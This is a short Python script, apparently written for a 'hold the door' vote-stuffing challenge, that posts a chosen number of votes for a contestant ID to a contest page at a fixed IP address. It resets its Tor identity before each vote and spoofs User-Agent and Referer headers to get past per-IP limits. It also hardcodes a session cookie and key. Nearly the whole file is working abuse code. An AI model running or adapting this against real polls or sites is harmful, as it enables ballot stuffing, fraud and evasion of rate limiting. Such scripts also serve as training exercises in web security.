#!/usr/bin/python3
from PIL import Image
import pytesseract
import requests
import io
from torrequest import TorRequest
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
ID = int(input("who's the lucky one? : "))
i = int(input("how many times mister?: "))
cookies = {
    'HoldTheDoor': 'f113024b10de77d8031c15bdcf2f830d67773813',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 OPR/66.0.3515.27',
    'Referer': 'http://158.69.76.135/level4.php',
}

data = {
  'id': ID,
  'holdthedoor': 'Submit',
  'key': 'f113024b10de77d8031c15bdcf2f830d67773813'
}
x = 0
while x < i:
	tr=TorRequest(password='uniuni')
	tr.reset_identity() #Reset Tor
	response = tr.post('http://158.69.76.135/level4.php', headers=headers, cookies=cookies, data=data, verify=False)
	ip= tr.get('http://ipecho.net/plain')
	print ("***********  Identity {} ^_^ ********* \n              {} ".format(x + 1, ip.text))
	x += 1
